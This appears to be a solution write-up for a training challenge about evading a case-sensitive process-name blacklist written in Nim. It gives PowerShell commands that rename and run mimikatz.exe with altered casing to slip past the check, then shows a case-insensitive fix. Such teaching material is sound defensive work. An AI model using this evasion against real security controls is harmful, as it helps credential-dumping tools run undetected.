---
title: "Solution 02: Case Sensitivity Exploit"
difficulty: easy
category: "Process Name Evasion"
---

[Back to Challenge]({{ '/challenges/02-case-sensitivity/' | relative_url }})

## Overview

The blacklist comparison is case-sensitive in Nim's `==` operator. The blacklist only contains lowercase entries.

## Solution

```powershell
# Any case variation bypasses the check
rename mimikatz.exe Mimikatz.exe
.\Mimikatz.exe

# Or more extreme
rename mimikatz.exe MIMIKATZ.EXE
.\MIMIKATZ.EXE

# Even a single character change works
rename mimikatz.exe mimiKatz.exe
.\mimiKatz.exe
```

## Why It Works

Nim's `==` operator for strings is **case-sensitive**:
- `"Mimikatz.exe" == "mimikatz.exe"` evaluates to `false`

Windows NTFS is **case-insensitive** for file operations, so `Mimikatz.exe` and `mimikatz.exe` refer to the same file. But the process name reported by the OS preserves the casing used.

## Fix

A real implementation would use `cmpIgnoreCase` or `toLowerAscii()` before comparison:

```nim
if info.exeName.toLowerAscii() == name:  # case-insensitive
```
